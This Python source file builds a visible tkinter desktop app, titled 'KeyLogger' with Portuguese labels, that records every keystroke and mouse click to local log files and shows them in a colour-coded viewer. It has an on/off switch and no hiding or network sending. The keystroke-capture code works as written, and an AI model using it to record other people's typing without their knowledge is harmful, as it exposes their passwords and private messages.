import tkinter as tk
from pynput import keyboard, mouse
from datetime import datetime

class KeyLoggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("KeyLogger")
        self.active = False
        self.key_listener = None
        self.mouse_listener = None

        # Estilo do Switch Button
        self.switch_frame = tk.Frame(root, bg="grey", bd=2, relief="raised", width=50, height=25)
        self.switch_frame.pack_propagate(False)  # Impede o frame de redimensionar
        self.switch_button = tk.Button(self.switch_frame, bg="white", width=2, height=1, command=self.toggle_logging, relief="flat")
        self.switch_label = tk.Label(self.switch_frame, text="OFF", bg="grey", fg="white")

        # Vinculando o mesmo comando do botão ao rótulo
        self.switch_label.bind("<Button-1>", lambda e: self.toggle_logging())

        self.switch_frame.pack(pady=60)
        self.switch_button.pack(side="left", fill="both", expand=True)
        self.switch_label.pack(side="left")

        # Label de Status
        self.status_label = tk.Label(root, text="Status: Desativado")
        self.status_label.pack()

        # Botão de Log
        self.log_btn = tk.Button(root, text="Ver Log", command=lambda: self.show_log(False))
        self.log_btn.pack()

    def on_press(self, key):
        try:
            if key == keyboard.Key.space:
                char = ' '
            else:
                char = key.char

            with open("log.txt", "a") as simple_log_file:
                simple_log_file.write(char)

            with open("detailed_log.txt", "a") as log_file:
                log_file.write(f"{datetime.now()} - Key pressed: {char}\n")
        except AttributeError:
            with open("detailed_log.txt", "a") as log_file:
                log_file.write(f"{datetime.now()} - Special key pressed: {key}\n")

    def on_click(self, x, y, button, pressed):
        if pressed:
            with open("detailed_log.txt", "a") as log_file:
                log_file.write(f"{datetime.now()} - Mouse clicked at ({x}, {y}) with {button}\n")

    def create_listeners(self):
        self.key_listener = keyboard.Listener(on_press=self.on_press)
        self.mouse_listener = mouse.Listener(on_click=self.on_click)

    def toggle_logging(self):
        self.active = not self.active
        self.animate_switch()

        if self.active:
            if self.key_listener is None or not self.key_listener.running:
                self.create_listeners()
            self.key_listener.start()
            self.mouse_listener.start()
        else:
            if self.key_listener is not None:
                self.key_listener.stop()
            if self.mouse_listener is not None:
                self.mouse_listener.stop()

    def animate_switch(self):
        if self.active:
            self.switch_button.pack(side="right", fill="both", expand=True)
            self.switch_frame.config(bg="green")
            self.switch_label.config(text="ON", bg="green")
            self.update_status("Registro Ativado.")
        else:
            self.switch_button.pack(side="left", fill="both", expand=True)
            self.switch_frame.config(bg="grey")
            self.switch_label.config(text="OFF", bg="grey")
            self.update_status("Registro Desativado.")

    def update_status(self, message):
        self.status_label.config(text=message)

    def apply_tags(self, log_text_widget):
        log_text_widget.tag_config("mouse", foreground="blue")
        log_text_widget.tag_config("key", foreground="green")
        log_text_widget.tag_config("special_key", foreground="red")

        log_content = log_text_widget.get("1.0", tk.END)
        log_text_widget.delete("1.0", tk.END)

        for line in log_content.split("\n"):
            if "Mouse clicked" in line:
                log_text_widget.insert(tk.END, line + "\n", "mouse")
            elif "Key pressed" in line:
                log_text_widget.insert(tk.END, line + "\n", "key")
            elif "Special key pressed" in line:
                log_text_widget.insert(tk.END, line + "\n", "special_key")
            else:
                log_text_widget.insert(tk.END, line + "\n")

    def show_log(self, detailed):
        log_window = tk.Toplevel(self.root)
        log_window.title("Log")
        log_text = tk.Text(log_window, height=20, width=60)
        log_text.pack()

        self.apply_tags(log_text)

        if detailed:
            switch_btn_text = "Visualização Normal"
            log_file_name = "detailed_log.txt"
            switch_command = lambda: self.switch_log_view(log_window, False)
        else:
            switch_btn_text = "Visualização Detalhada"
            log_file_name = "log.txt"
            switch_command = lambda: self.switch_log_view(log_window, True)

        switch_btn = tk.Button(log_window, text=switch_btn_text, command=switch_command)
        switch_btn.pack()

        with open(log_file_name, "r") as log_file:
            log_content = log_file.read()
        log_text.insert(tk.END, log_content)
        self.apply_tags(log_text)

    def switch_log_view(self, parent_window, detailed):
        parent_window.destroy()
        self.show_log(detailed)

root = tk.Tk()
root.geometry("400x200")

# Centralizando a janela
window_width = 400
window_height = 200
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
center_x = int(screen_width/2 - window_width / 2)
center_y = int(screen_height/2 - window_height / 2)
root.geometry(f"{window_width}x{window_height}+{center_x}+{center_y}")

app = KeyLoggerApp(root)

root.mainloop()
